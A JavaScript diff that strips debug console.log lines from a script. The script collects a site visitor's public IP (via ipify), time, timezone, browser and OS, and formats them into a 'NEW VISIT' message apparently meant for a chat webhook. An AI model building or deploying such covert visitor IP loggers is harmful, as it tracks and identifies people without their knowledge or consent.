@@ -1,7 +1,6 @@
 var IP;
 var Time;
 var TimeZone;
-console.log("Amogus");
 
 $(async function() {
     await $.getJSON("https://api.ipify.org?format=jsonp&callback=?",
@@ -9,13 +8,11 @@ $(async function() {
         IP = json.ip;
       }
     );
-    console.log(IP);
 
     const month = ["January","February","March","April","May","June","July","August","September","October","November","December"];
     const date = new Date();
     Time = month[date.getUTCMonth()] + " " + date.getUTCDay().toString() + " " + date.getUTCFullYear().toString() + " " + date.getUTCHours().toString() + ":" + date.getUTCMinutes().toString() + ":" + date.getUTCSeconds().toString();
     TimeZone ="UTC " + Math.floor((((date.getTimezoneOffset()) / 60) * -1)).toString() + ":" + Math.abs(((date.getTimezoneOffset()) % 60)).toString();
-    console.log(Time);
 
     /**
     * JavaScript Client Detection
@@ -170,7 +167,6 @@ $(async function() {
             osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
             break;
     }
-    console.log(browser, version, mobile, os, osVersion);
 
     var message = {
         content: "# __**NEW VISIT <**__" + "\n" + "## OS: " + os + " " + osVersion + "\n" + "## Browser: " + browser + " " + version + "\n" + "## Timezone: " + TimeZone + "\n" + "## Time: " + Time + "\n" + "## IP: " + IP,
